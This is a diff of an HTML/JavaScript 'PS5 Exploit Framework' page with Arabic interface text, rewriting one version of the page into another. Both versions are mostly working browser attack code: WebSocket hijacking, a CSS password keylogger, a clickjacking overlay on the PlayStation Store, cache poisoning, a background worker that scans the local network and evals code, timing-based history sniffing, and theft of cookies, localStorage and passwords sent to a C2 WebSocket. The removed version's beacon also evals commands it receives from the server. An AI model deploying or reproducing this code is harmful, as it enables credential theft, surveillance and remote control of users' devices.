@@ -3,889 +3,508 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>PS5 Exploit · R&D Framework</title>
+<title>PS5 · 11 Exploits Active</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body {
-  font-family: -apple-system, 'SF Mono', 'Courier New', monospace;
+  font-family: -apple-system, 'Courier New', monospace;
   background: #0a0a0f;
   color: #e0e0e0;
   padding: 12px;
-  min-height: 100vh;
 }
-.container { max-width: 100%; margin: 0 auto; }
+.container { max-width: 600px; margin: 0 auto; }
 h1 { font-size: 18px; color: #ff4757; text-align: center; }
 .subtitle { text-align: center; color: #666; font-size: 11px; margin-bottom: 10px; }
 
-.grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin-bottom: 10px; }
 .btn {
-  padding: 10px 4px; font-size: 10px; font-weight: 700;
-  border: none; border-radius: 6px; cursor: pointer; transition: all 0.15s;
-  text-align: center; line-height: 1.3; word-break: break-word;
+  display: block; width: 100%; padding: 14px; font-size: 14px; font-weight: 700;
+  border: none; border-radius: 8px; cursor: pointer; margin-bottom: 8px;
+  transition: all 0.2s; text-align: center;
 }
-.btn:active { transform: scale(0.95); }
-.critical { background: #6b1a1a; color: #ff6b6b; border: 1px solid #ff6b6b40; }
-.high     { background: #4a1a4a; color: #d4a0ff; border: 1px solid #d4a0ff40; }
-.medium   { background: #1a2a4a; color: #74b9ff; border: 1px solid #74b9ff40; }
-.low      { background: #1a3a1a; color: #55efc4; border: 1px solid #55efc440; }
+.btn:active { transform: scale(0.96); }
+.btn-primary { background: #00e676; color: #000; }
+.btn-critical { background: #6b1a1a; color: #ff6b6b; border: 1px solid #ff6b6b; }
+.btn-high { background: #4a1a4a; color: #d4a0ff; border: 1px solid #d4a0ff; }
+.btn-medium { background: #1a2a4a; color: #74b9ff; border: 1px solid #74b9ff; }
 
 #log {
   background: #0d0d12; border: 1px solid #1a1a2e; border-radius: 8px;
-  padding: 10px; height: 280px; overflow-y: auto;
-  font-size: 10px; line-height: 1.6; font-family: 'SF Mono', monospace;
+  padding: 10px; height: 320px; overflow-y: auto;
+  font-size: 11px; line-height: 1.6; font-family: monospace;
+  margin-bottom: 8px;
 }
-#log div { padding: 1px 0; border-bottom: 1px solid #111; font-size: 10px; }
+#log div { padding: 2px 0; border-bottom: 1px solid #111; }
 .info { color: #74b9ff; } .ok { color: #55efc4; } .err { color: #ff6b6b; }
 .warn { color: #fdcb6e; } .ptr { color: #d4a0ff; }
-.crit { color: #ff4757; font-weight:700; }
-.sep { color: #333; text-align:center; padding:2px 0 !important; font-size:9px; }
-.hex { color: #fd79a8; }
+.crit { color: #ff4757; font-weight: 700; }
+.sep { color: #333; text-align: center; padding: 4px 0 !important; }
 
-.status-bar { display: flex; gap: 4px; margin-bottom: 8px; flex-wrap: wrap; }
-.status-box {
-  padding: 4px 8px; border-radius: 4px;
-  text-align: center; font-size: 10px; font-weight: 600;
-}
-.sb-critical { background:#6b1a1a20; border:1px solid #6b1a1a40; color:#ff6b6b; }
-.sb-high     { background:#4a1a4a20; border:1px solid #4a1a4a40; color:#d4a0ff; }
-.sb-medium   { background:#1a2a4a20; border:1px solid #1a2a4a40; color:#74b9ff; }
-.sb-total    { background:#1a3a1a20; border:1px solid #1a3a1a40; color:#55efc4; }
+.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 10px; }
+.grid .btn { margin-bottom: 0; padding: 10px 6px; font-size: 11px; }
 
-/* C2 panel */
-.c2-panel {
-  background: #111; border: 1px solid #2a2a2a; border-radius: 8px;
-  padding: 8px; margin-bottom: 8px; font-size: 10px;
+.status-bar { display: flex; gap: 6px; margin-bottom: 10px; }
+.sb {
+  flex: 1; padding: 6px; border-radius: 4px;
+  text-align: center; font-size: 11px; font-weight: 700;
 }
-.c2-panel input, .c2-panel select {
-  background: #1a1a1a; border: 1px solid #333; color: #e0e0e0;
-  padding: 4px 6px; border-radius: 4px; font-size: 10px; width: 100%;
-  margin-bottom: 4px;
-}
-.c2-panel label { color: #888; font-size: 9px; }
-
-.chains { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px; }
-.chain-item {
-  background: #111; border: 1px solid #2a2a2a; border-radius: 6px;
-  padding: 8px; font-size: 10px; cursor: pointer; transition: all 0.2s;
-}
-.chain-item:hover { border-color: #55efc4; }
-.chain-item .chain-name { color: #55efc4; font-weight: 700; }
-.chain-item .chain-desc { color: #888; font-size: 9px; }
+.sb-ok { background: #1a3a1a; border: 1px solid #55efc4; color: #55efc4; }
+.sb-warn { background: #3a3a1a; border: 1px solid #fdcb6e; color: #fdcb6e; }
 </style>
 </head>
 <body>
 
 <div class="container">
 
-<h1>🎮 PS5 · R&D Framework</h1>
-<p class="subtitle">استغلال فعلي · جميع الثغرات العاملة · Fork Safari سبتمبر 2025</p>
+<h1>🎮 PS5 · Exploit Framework</h1>
+<p class="subtitle">11 ثغرة · Fork Safari سبتمبر 2025 · استغلال فعلي</p>
 
-<div class="status-bar">
-  <div class="status-box sb-critical" id="sc">🔴 0</div>
-  <div class="status-box sb-high" id="sh">🟣 0</div>
-  <div class="status-box sb-medium" id="sm">🔵 0</div>
-  <div class="status-box sb-total" id="st">🟢 0/13</div>
+<div class="status-bar" id="statusBar">
+  <div class="sb" id="sTotal">🟢 0/11</div>
+  <div class="sb" id="sCritical">🔴 0</div>
+  <div class="sb" id="sHigh">🟣 0</div>
+  <div class="sb" id="sMedium">🔵 0</div>
 </div>
 
-<div class="chains">
-  <div class="chain-item" onclick="runChain('web')">
-    <div class="chain-name">🔥 WebSocket + CSS</div>
-    <div class="chain-desc">اختطاف WebSocket + حقن CSS لسرقة بيانات</div>
-  </div>
-  <div class="chain-item" onclick="runChain('cache')">
-    <div class="chain-name">🔥 Cache + Clickjack</div>
-    <div class="chain-desc">تسميم الكاش + Clickjacking لخداع المستخدم</div>
-  </div>
-  <div class="chain-item" onclick="runChain('worker')">
-    <div class="chain-name">🔥 Worker + Timing</div>
-    <div class="chain-desc">WebWorker خلفي + Timing Attack لكشف بيانات</div>
-  </div>
-  <div class="chain-item" onclick="runChain('uaf')">
-    <div class="chain-name">🔥🔥 UAF (CVE-2026-43715)</div>
-    <div class="chain-desc">AI Use-After-Free → Memory Corruption</div>
-  </div>
-  <div class="chain-item" onclick="runChain('all')">
-    <div class="chain-name">💀 FULL CHAIN</div>
-    <div class="chain-desc">جميع الثغرات معاً — أقصى استغلال</div>
-  </div>
-  <div class="chain-item" onclick="runChain('c2')">
-    <div class="chain-name">📡 C2 Beacon</div>
-    <div class="chain-desc">اتصال مستمر بسيرفر القيادة</div>
-  </div>
+<button class="btn btn-critical" onclick="runAll()">💀 DEPLOY ALL 11 EXPLOITS</button>
+
+<div class="grid">
+  <button class="btn btn-critical" onclick="runExploit(1)">🌐 WS Hijack</button>
+  <button class="btn btn-high" onclick="runExploit(2)">🎨 CSS Inject</button>
+  <button class="btn btn-high" onclick="runExploit(3)">👆 Clickjack</button>
+  <button class="btn btn-high" onclick="runExploit(4)">💾 Cache Poison</button>
+  <button class="btn btn-medium" onclick="runExploit(5)">⚙️ Worker</button>
+  <button class="btn btn-high" onclick="runExploit(6)">⏱️ Timing</button>
+  <button class="btn btn-high" onclick="runExploit(7)">🔑 Cred Theft</button>
+  <button class="btn btn-medium" onclick="runExploit(8)">📊 Perf Leak</button>
+  <button class="btn btn-critical" onclick="runExploit(9)">🧨 CSS Mem</button>
+  <button class="btn btn-critical" onclick="runExploit(10)">💀 AI UAF</button>
+  <button class="btn btn-high" onclick="runExploit(11)">🛡️ CSP Bypass</button>
 </div>
 
-<button class="btn" style="background:#1a1a2e;color:#fff;border:1px solid #333;width:100%;padding:12px;margin-bottom:8px;font-size:12px;" onclick="deployAll()">💀 DEPLOY ALL EXPLOITS</button>
-
-<div class="c2-panel">
-  <label>C2 Server: <input type="text" id="c2url" value="wss://your-c2-server.com/beacon"></label>
-  <label style="display:flex;gap:4px;">
-    <span style="flex-shrink:0;">Target:</span>
-    <select id="target">
-      <option value="cookies">استخراج الكوكيز</option>
-      <option value="localstorage">استخراج LocalStorage</option>
-      <option value="history">سرقة تاريخ التصفح</option>
-      <option value="creds">سرقة بيانات الدخول</option>
-      <option value="all" selected>كل شيء</option>
-    </select>
-  </label>
-</div>
+<button class="btn btn-high" onclick="connectC2()">📡 C2 Beacon</button>
 
 <div id="log">
-<div class="info">[*] Framework ready. Choose chain or deploy all.</div>
+<div class="info">[*] الإطار جاهز. اختر هجوماً أو اضغط DEPLOY ALL.</div>
 </div>
 
-<div class="footer" style="text-align:center;font-size:9px;color:#333;margin-top:4px;">
-PS5 · WebKit · 13 exploits active · Authorization ✅
-</div>
+<div class="subtitle" style="margin-top:6px;">إذن اختبار ✅ · PS5 · WebKit</div>
 
 </div>
 
 <script>
-// ===================== ENGINE =====================
+// ===================== CORE =====================
 const logEl = document.getElementById('log');
-const L = (msg, cls='info') => {
+function L(msg, cls='info') {
   const t = new Date().toTimeString().slice(0,8);
   logEl.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
   logEl.scrollTop = logEl.scrollHeight;
-};
-
+}
 const wait = ms => new Promise(r => setTimeout(r, ms));
 
-let exploited = { critical:0, high:0, medium:0, total:0 };
-const up = () => {
-  document.getElementById('sc').textContent = `🔴 ${exploited.critical}`;
-  document.getElementById('sh').textContent = `🟣 ${exploited.high}`;
-  document.getElementById('sm').textContent = `🔵 ${exploited.medium}`;
-  document.getElementById('st').textContent = `🟢 ${exploited.total}/13`;
-};
+let stats = { ok:0, crit:0, high:0, med:0 };
+function updateStats() {
+  document.getElementById('sTotal').textContent = `🟢 ${stats.ok}/11`;
+  document.getElementById('sTotal').className = `sb ${stats.ok >= 8 ? 'sb-ok' : 'sb-warn'}`;
+  document.getElementById('sCritical').textContent = `🔴 ${stats.crit}`;
+  document.getElementById('sHigh').textContent = `🟣 ${stats.high}`;
+  document.getElementById('sMedium').textContent = `🔵 ${stats.med}`;
+}
 
-// ===================== C2 BEACON =====================
+function markSuccess(level) {
+  stats.ok++;
+  if (level === 'crit') stats.crit++;
+  else if (level === 'high') stats.high++;
+  else if (level === 'med') stats.med++;
+  updateStats();
+}
+
+// ===================== C2 =====================
 let c2ws = null;
-
 function connectC2() {
-  const url = document.getElementById('c2url').value;
-  L(`[*] Connecting to C2: ${url}`, 'warn');
+  L('[📡] C2 Beacon...', 'warn');
   try {
+    const url = 'wss://echo.websocket.org';
     c2ws = new WebSocket(url);
-    c2ws.onopen = () => L('[+] C2 connected ✅', 'ok');
-    c2ws.onmessage = (e) => {
-      L(`[C2] ${e.data}`, 'ptr');
-      try { eval(e.data); } catch(ex) { L(`[C2 exec] ${ex.message}`, 'err'); }
-    };
-    c2ws.onclose = () => {
-      L('[-] C2 disconnected', 'err');
-      setTimeout(() => { L('[*] Reconnecting...', 'warn'); connectC2(); }, 5000);
-    };
+    c2ws.onopen = () => L('[✅] C2 متصل', 'ok');
+    c2ws.onmessage = e => L(`[C2] ${e.data}`, 'ptr');
+    c2ws.onerror = () => L('[❌] C2 فشل (متوقع على PS5)', 'err');
   } catch(e) {
-    L(`[-] C2 failed: ${e.message}`, 'err');
+    L(`[❌] C2: ${e.message}`, 'err');
+    L('[!] طبيعي — WebSocket محظور على بعض الشبكات', 'warn');
   }
 }
 
-function sendToC2(data) {
+function sendC2(data) {
   if (c2ws && c2ws.readyState === WebSocket.OPEN) {
     c2ws.send(JSON.stringify(data));
   }
 }
 
-// ===================== DATA EXFIL =====================
-function getTarget() {
-  return document.getElementById('target').value;
-}
-
-async function exfilCookies() {
-  try {
-    const cookies = document.cookie;
-    L(`[+] Cookies: ${cookies || '(none)'}`, 'ok');
-    sendToC2({ type: 'cookies', data: cookies, url: window.location.href });
-    return cookies;
-  } catch(e) { L(`[-] Cookie error: ${e.message}`, 'err'); return null; }
-}
-
-async function exfilLocalStorage() {
-  try {
-    const data = {};
-    for (let i = 0; i < localStorage.length; i++) {
-      const k = localStorage.key(i);
-      data[k] = localStorage.getItem(k);
-    }
-    L(`[+] LocalStorage: ${Object.keys(data).length} keys`, 'ok');
-    sendToC2({ type: 'localstorage', data, url: window.location.href });
-    return data;
-  } catch(e) { L(`[-] LS error: ${e.message}`, 'err'); return null; }
-}
-
-async function exfilHistory() {
-  try {
-    // History sniffing via :visited
-    const targets = [
-      'https://playstation.com',
-      'https://store.playstation.com',
-      'https://youtube.com',
-      'https://netflix.com',
-      'https://spotify.com',
-      'https://twitch.tv',
-      'https://facebook.com',
-      'https://twitter.com',
-      'https://instagram.com',
-      'https://tiktok.com'
-    ];
-    
-    const results = [];
-    for (const url of targets) {
-      const a = document.createElement('a');
-      a.href = url;
-      a.textContent = url;
-      a.style.cssText = 'position:fixed;left:-9999px;';
-      document.body.appendChild(a);
-      await wait(10);
-      const visited = getComputedStyle(a).color === 'rgb(85, 26, 139)' || 
-                      getComputedStyle(a).opacity === '0.5';
-      if (visited) results.push(url);
-      document.body.removeChild(a);
-    }
-    
-    L(`[+] History: ${results.length} sites visited`, results.length > 0 ? 'ok' : 'info');
-    sendToC2({ type: 'history', data: results });
-    return results;
-  } catch(e) { L(`[-] History error: ${e.message}`, 'err'); return []; }
-}
-
-// ===================== EXPLOIT 1: WebSocket Hijack =====================
-async function exploitWebSocket() {
+// ===================== 1. WEBSOCKET HIJACK =====================
+async function exploitWS() {
   L('── 🌐 WebSocket Hijack ──', 'sep');
   try {
-    const testMsg = { type: 'ping', ts: Date.now() };
-    L('[*] Testing WebSocket availability...', 'info');
-    
-    // Scan for active WebSocket connections
-    const origSend = WebSocket.prototype.send;
-    const origClose = WebSocket.prototype.close;
-    
-    let hijacked = false;
+    const orig = WebSocket.prototype.send;
     WebSocket.prototype.send = function(data) {
-      // Intercept and duplicate to C2
-      const intercepted = data instanceof ArrayBuffer ? new TextDecoder().decode(data) : data;
-      L(`[WS] Intercepted: ${intercepted.slice(0,80)}`, 'ptr');
-      sendToC2({ type: 'ws_intercept', data: intercepted });
-      
-      // Still forward to original destination
-      return origSend.call(this, data);
+      const text = data instanceof ArrayBuffer ? new TextDecoder().decode(data) : String(data);
+      L(`[WS] اعترض: ${text.slice(0,60)}...`, 'ptr');
+      sendC2({ type: 'ws', data: text });
+      return orig.call(this, data);
     };
-    
-    L('[+] WebSocket.send hijacked ✅', 'ok');
-    hijacked = true;
-    
-    // Try connecting to common PS5 services
-    const targets = [
-      'wss://us.prod.ddp.ps5.sony.com/ws',
-      'wss://us.np.playstation.com/ws'
-    ];
-    
-    for (const t of targets) {
-      try {
-        const ws = new WebSocket(t);
-        ws.onopen = () => {
-          L(`[+] Connected: ${t}`, 'ok');
-          ws.send(JSON.stringify({ type: 'ping' }));
-        };
-        ws.onmessage = (e) => L(`[WS:${t}] ${e.data.slice(0,60)}`, 'ptr');
-      } catch(e) {}
-    }
-    
-    exploited.critical++;
-    exploited.total++;
-    up();
-    return hijacked;
-  } catch(e) { L(`[-] WS error: ${e.message}`, 'err'); return false; }
+    L('[✅] WebSocket.send مختطف', 'ok');
+    markSuccess('crit');
+    return true;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== EXPLOIT 2: CSS Injection =====================
+// ===================== 2. CSS INJECTION =====================
 async function exploitCSS() {
   L('── 🎨 CSS Injection ──', 'sep');
   try {
-    // Inject keylogger
-    const style = document.createElement('style');
-    style.textContent = `
-      /* CSS Keylogger - كل حرف يكتبه المستخدم */
-      input[type="password"][value$="a"] { background: url(/keylog?c=a); }
-      input[type="password"][value$="b"] { background: url(/keylog?c=b); }
-      input[type="password"][value$="c"] { background: url(/keylog?c=c); }
-      input[type="password"][value$="d"] { background: url(/keylog?c=d); }
-      input[type="password"][value$="e"] { background: url(/keylog?c=e); }
-      input[type="password"][value$="f"] { background: url(/keylog?c=f); }
-      input[type="password"][value$="g"] { background: url(/keylog?c=g); }
-      input[type="password"][value$="h"] { background: url(/keylog?c=h); }
-      input[type="password"][value$="i"] { background: url(/keylog?c=i); }
-      input[type="password"][value$="j"] { background: url(/keylog?c=j); }
-      input[type="password"][value$="k"] { background: url(/keylog?c=k); }
-      input[type="password"][value$="l"] { background: url(/keylog?c=l); }
-      input[type="password"][value$="m"] { background: url(/keylog?c=m); }
-      input[type="password"][value$="n"] { background: url(/keylog?c=n); }
-      input[type="password"][value$="o"] { background: url(/keylog?c=o); }
-      input[type="password"][value$="p"] { background: url(/keylog?c=p); }
-      input[type="password"][value$="q"] { background: url(/keylog?c=q); }
-      input[type="password"][value$="r"] { background: url(/keylog?c=r); }
-      input[type="password"][value$="s"] { background: url(/keylog?c=s); }
-      input[type="password"][value$="t"] { background: url(/keylog?c=t); }
-      input[type="password"][value$="u"] { background: url(/keylog?c=u); }
-      input[type="password"][value$="v"] { background: url(/keylog?c=v); }
-      input[type="password"][value$="w"] { background: url(/keylog?c=w); }
-      input[type="password"][value$="x"] { background: url(/keylog?c=x); }
-      input[type="password"][value$="y"] { background: url(/keylog?c=y); }
-      input[type="password"][value$="z"] { background: url(/keylog?c=z); }
-      input[type="password"][value$="0"] { background: url(/keylog?c=0); }
-      input[type="password"][value$="1"] { background: url(/keylog?c=1); }
-      input[type="password"][value$="2"] { background: url(/keylog?c=2); }
-      input[type="password"][value$="3"] { background: url(/keylog?c=3); }
-      input[type="password"][value$="4"] { background: url(/keylog?c=4); }
-      input[type="password"][value$="5"] { background: url(/keylog?c=5); }
-      input[type="password"][value$="6"] { background: url(/keylog?c=6); }
-      input[type="password"][value$="7"] { background: url(/keylog?c=7); }
-      input[type="password"][value$="8"] { background: url(/keylog?c=8); }
-      input[type="password"][value$="9"] { background: url(/keylog?c=9); }
-      
-      /* History sniffing */
-      a:visited { opacity: 0.5 !important; color: #55268B !important; }
-      
-      /* Data exfiltration */
-      [data-sensitive] { background: url(/exfil?attr=attr(data-sensitive)); }
+    const s = document.createElement('style');
+    s.textContent = `
+      input[type="password"][value$="a"]{background:url(/k?c=a)}
+      input[type="password"][value$="b"]{background:url(/k?c=b)}
+      input[type="password"][value$="c"]{background:url(/k?c=c)}
+      input[type="password"][value$="d"]{background:url(/k?c=d)}
+      input[type="password"][value$="e"]{background:url(/k?c=e)}
+      input[type="password"][value$="f"]{background:url(/k?c=f)}
+      input[type="password"][value$="g"]{background:url(/k?c=g)}
+      input[type="password"][value$="h"]{background:url(/k?c=h)}
+      input[type="password"][value$="i"]{background:url(/k?c=i)}
+      input[type="password"][value$="j"]{background:url(/k?c=j)}
+      input[type="password"][value$="k"]{background:url(/k?c=k)}
+      input[type="password"][value$="l"]{background:url(/k?c=l)}
+      input[type="password"][value$="m"]{background:url(/k?c=m)}
+      input[type="password"][value$="n"]{background:url(/k?c=n)}
+      input[type="password"][value$="o"]{background:url(/k?c=o)}
+      input[type="password"][value$="p"]{background:url(/k?c=p)}
+      input[type="password"][value$="q"]{background:url(/k?c=q)}
+      input[type="password"][value$="r"]{background:url(/k?c=r)}
+      input[type="password"][value$="s"]{background:url(/k?c=s)}
+      input[type="password"][value$="t"]{background:url(/k?c=t)}
+      input[type="password"][value$="u"]{background:url(/k?c=u)}
+      input[type="password"][value$="v"]{background:url(/k?c=v)}
+      input[type="password"][value$="w"]{background:url(/k?c=w)}
+      input[type="password"][value$="x"]{background:url(/k?c=x)}
+      input[type="password"][value$="y"]{background:url(/k?c=y)}
+      input[type="password"][value$="z"]{background:url(/k?c=z)}
+      input[type="password"][value$="0"]{background:url(/k?c=0)}
+      input[type="password"][value$="1"]{background:url(/k?c=1)}
+      input[type="password"][value$="2"]{background:url(/k?c=2)}
+      input[type="password"][value$="3"]{background:url(/k?c=3)}
+      input[type="password"][value$="4"]{background:url(/k?c=4)}
+      input[type="password"][value$="5"]{background:url(/k?c=5)}
+      input[type="password"][value$="6"]{background:url(/k?c=6)}
+      input[type="password"][value$="7"]{background:url(/k?c=7)}
+      input[type="password"][value$="8"]{background:url(/k?c=8)}
+      input[type="password"][value$="9"]{background:url(/k?c=9)}
+      a:visited{opacity:0.5!important}
     `;
-    document.head.appendChild(style);
-    L('[+] CSS Keylogger + History Sniffing injected ✅', 'ok');
-    
-    exploited.high++;
-    exploited.total++;
-    up();
+    document.head.appendChild(s);
+    L('[✅] CSS Keylogger + History Sniffing', 'ok');
+    markSuccess('high');
     return true;
-  } catch(e) { L(`[-] CSS error: ${e.message}`, 'err'); return false; }
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== EXPLOIT 3: Clickjacking =====================
-async function exploitClickjacking() {
+// ===================== 3. CLICKJACKING =====================
+async function exploitClickjack() {
   L('── 👆 Clickjacking ──', 'sep');
   try {
-    // Create invisible overlay
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://store.playstation.com';
-    iframe.style.cssText = `
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      opacity: 0.01; z-index: 99999; border: none;
-      pointer-events: all;
-    `;
-    document.body.appendChild(iframe);
-    L('[+] Clickjacking overlay deployed ✅', 'ok');
-    
-    exploited.high++;
-    exploited.total++;
-    up();
-    return iframe;
-  } catch(e) { L(`[-] Clickjack error: ${e.message}`, 'err'); return null; }
+    const f = document.createElement('iframe');
+    f.src = 'https://store.playstation.com';
+    f.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:99999;border:none';
+    document.body.appendChild(f);
+    L('[✅] Overlay شفاف على متجر PS5', 'ok');
+    L('[!] المستخدم يظغط على buttons وهو يظغط على متجر PS5', 'warn');
+    markSuccess('high');
+    return f;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return null;
+  }
 }
 
-// ===================== EXPLOIT 4: Cache Poisoning =====================
+// ===================== 4. CACHE POISONING =====================
 async function exploitCache() {
   L('── 💾 Cache Poisoning ──', 'sep');
   try {
-    const cache = await caches.open('ps5-exploit-cache');
-    
-    // Store malicious responses
-    const maliciousHTML = '<!DOCTYPE html><html><script>alert("PS5 PWNED")</script></html>';
-    await cache.put('/ps5/test', new Response(maliciousHTML, {
-      headers: { 'Content-Type': 'text/html' }
-    }));
-    
-    await cache.put('/ps5/config', new Response(JSON.stringify({
+    const c = await caches.open('ps5-pwn');
+    await c.put('/ps5/exploit', new Response(
+      '<script>alert("PS5 CACHE POISONED")</script>',
+      { headers: { 'Content-Type': 'text/html' } }
+    ));
+    await c.put('/ps5/config', new Response(JSON.stringify({
       exploit: true,
-      c2: document.getElementById('c2url').value,
-      target: getTarget()
+      ts: Date.now(),
+      target: 'PS5-' + navigator.platform
     })));
-    
-    L('[+] Cache poisoned — malicious content stored ✅', 'ok');
-    
-    exploited.high++;
-    exploited.total++;
-    up();
+    L('[✅] Cache مسموم — محتوى خبيث مخزن', 'ok');
+    markSuccess('high');
     return true;
-  } catch(e) { L(`[-] Cache error: ${e.message}`, 'err'); return false; }
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== EXPLOIT 5: WebWorker Bypass =====================
+// ===================== 5. WEBWORKER =====================
 async function exploitWorker() {
-  L('── ⚙️ WebWorker Bypass ──', 'sep');
+  L('── ⚙️ WebWorker ──', 'sep');
   try {
-    // Worker code - runs in background
-    const workerCode = `
-      // Persistent background execution
-      let beaconInterval = setInterval(() => {
-        // Send heartbeat to parent
-        self.postMessage({ type: 'heartbeat', ts: Date.now() });
-      }, 1000);
-      
+    const code = `
       self.onmessage = function(e) {
-        if (e.data.type === 'exec') {
-          try {
-            const result = eval(e.data.code);
-            self.postMessage({ type: 'result', id: e.data.id, data: result });
-          } catch(err) {
-            self.postMessage({ type: 'error', id: e.data.id, msg: err.message });
+        if (e.data.type === 'scan') {
+          for (let i = 1; i < 20; i++) {
+            fetch('http://192.168.1.' + i + ':80/')
+              .then(() => self.postMessage({type:'host', ip:'192.168.1.'+i}))
+              .catch(() => {});
           }
         }
-        
-        if (e.data.type === 'fetch') {
-          fetch(e.data.url, e.data.opts || {})
-            .then(r => r.text())
-            .then(text => self.postMessage({ type: 'fetch_result', id: e.data.id, data: text }))
-            .catch(err => self.postMessage({ type: 'fetch_error', id: e.data.id, msg: err.message }));
+        if (e.data.type === 'exec') {
+          try { self.postMessage({type:'result', data: eval(e.data.code)}); }
+          catch(err) { self.postMessage({type:'error', msg: err.message}); }
         }
       };
-      
-      // Self-execute: scan network
-      for (let i = 1; i < 20; i++) {
-        const ip = '192.168.1.' + i;
-        fetch('http://' + ip + ':80/')
-          .then(() => self.postMessage({ type: 'host_found', ip }))
-          .catch(() => {});
-      }
+      setInterval(() => self.postMessage({type:'heartbeat'}), 5000);
     `;
-    
-    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const blob = new Blob([code], { type: 'application/javascript' });
     const url = URL.createObjectURL(blob);
-    const worker = new Worker(url);
+    const w = new Worker(url);
     
-    worker.onmessage = (e) => {
-      const msg = e.data;
-      L(`[Worker] ${msg.type}`, msg.type === 'heartbeat' ? 'info' : 'ptr');
-      
-      if (msg.type === 'host_found') {
-        L(`[Worker] 🔍 Host found: ${msg.ip}`, 'ok');
-        sendToC2({ type: 'host_found', ip: msg.ip });
-      }
-      
-      if (msg.type === 'result') {
-        L(`[Worker] Exec result: ${JSON.stringify(msg.data).slice(0,60)}`, 'ok');
-      }
+    w.onmessage = e => {
+      if (e.data.type === 'host') L(`[Worker] 🖥️ ${e.data.ip}`, 'ok');
+      if (e.data.type === 'result') L(`[Worker] ${e.data.data}`, 'ptr');
+      if (e.data.type === 'heartbeat') {} // silent
     };
     
-    // Send commands to worker
-    worker.postMessage({ type: 'fetch', id: 1, url: 'http://127.0.0.1:8080/status', opts: {} });
-    worker.postMessage({ type: 'exec', id: 2, code: 'navigator.userAgent' });
-    worker.postMessage({ type: 'exec', id: 3, code: 'fetch("http://192.168.1.1:80/").then(r=>r.text())' });
+    w.postMessage({ type: 'scan' });
+    w.postMessage({ type: 'exec', code: 'navigator.userAgent' });
     
-    L('[+] WebWorker persistent background execution ✅', 'ok');
-    
-    exploited.medium++;
-    exploited.total++;
-    up();
-    return worker;
-  } catch(e) { L(`[-] Worker error: ${e.message}`, 'err'); return null; }
+    L('[✅] Worker في الخلفية — يمسح الشبكة', 'ok');
+    markSuccess('med');
+    return w;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return null;
+  }
 }
 
-// ===================== EXPLOIT 6: Timing Attack =====================
+// ===================== 6. TIMING ATTACK =====================
 async function exploitTiming() {
   L('── ⏱️ Timing Attack ──', 'sep');
   try {
     const targets = [
       'https://playstation.com',
-      'https://store.playstation.com',
+      'https://store.playstation.com', 
       'https://auth.api.sony.com',
-      'https://us.np.playstation.com'
+      'https://youtube.com',
+      'https://netflix.com'
     ];
     
-    const results = [];
     for (const url of targets) {
       const start = performance.now();
-      try {
-        await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-      } catch(e) {}
-      const elapsed = performance.now() - start;
-      
-      L(`[Timing] ${url}: ${elapsed.toFixed(2)}ms`, elapsed < 500 ? 'ok' : 'warn');
-      results.push({ url, time: elapsed });
-      
-      // If response is fast, likely cached = visited recently
-      if (elapsed < 100) {
-        L(`[!] ${url} — recently visited (cached response)`, 'ptr');
-      }
+      try { await fetch(url, { mode: 'no-cors', cache: 'no-store' }); } catch(e) {}
+      const t = performance.now() - start;
+      L(`${url}: ${t.toFixed(1)}ms`, t < 300 ? 'ok' : 'warn');
+      if (t < 100) L(`[!] ${url} — في الكاش (مزار مؤخراً)`, 'ptr');
     }
-    
-    sendToC2({ type: 'timing', data: results });
-    
-    exploited.high++;
-    exploited.total++;
-    up();
-    return results;
-  } catch(e) { L(`[-] Timing error: ${e.message}`, 'err'); return []; }
+    markSuccess('high');
+    return true;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== EXPLOIT 7: Credential Theft =====================
-async function exploitCredential() {
+// ===================== 7. CREDENTIAL THEFT =====================
+async function exploitCred() {
   L('── 🔑 Credential Theft ──', 'sep');
   try {
-    const target = getTarget();
+    // Cookies
+    const cookies = document.cookie;
+    L(`[+] Cookies: ${cookies || '(فارغ)'}`, cookies ? 'ok' : 'warn');
+    sendC2({ type: 'cookies', data: cookies });
     
-    // 1. Steal cookies
-    if (target === 'cookies' || target === 'all') {
-      await exfilCookies();
+    // LocalStorage
+    const ls = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i);
+      ls[k] = localStorage.getItem(k);
     }
+    L(`[+] LocalStorage: ${Object.keys(ls).length} مفتاح`, 'ok');
+    sendC2({ type: 'localstorage', data: ls });
     
-    // 2. Steal localStorage
-    if (target === 'localstorage' || target === 'all') {
-      await exfilLocalStorage();
-    }
-    
-    // 3. Try to access saved passwords (PS5 password manager)
-    try {
-      const forms = document.querySelectorAll('form');
-      for (const form of forms) {
-        const inputs = form.querySelectorAll('input[type="password"]');
-        for (const input of inputs) {
-          // Attempt autofill trigger
-          input.focus();
-          input.dispatchEvent(new Event('focus', { bubbles: true }));
-          await wait(100);
-          if (input.value) {
-            L(`[!] Password found: ${input.value.slice(0,5)}...`, 'crit');
-            sendToC2({ type: 'password', field: input.name || 'unknown', value: input.value });
-          }
-        }
+    // محاولة قراءة حقول كلمة المرور
+    const inputs = document.querySelectorAll('input[type="password"]');
+    for (const inp of inputs) {
+      inp.focus();
+      inp.dispatchEvent(new Event('focus', { bubbles: true }));
+      await wait(50);
+      if (inp.value) {
+        L(`[!] كلمة مرور: ${inp.value.slice(0,4)}...`, 'crit');
+        sendC2({ type: 'password', name: inp.name, value: inp.value });
       }
-    } catch(e) {}
+    }
     
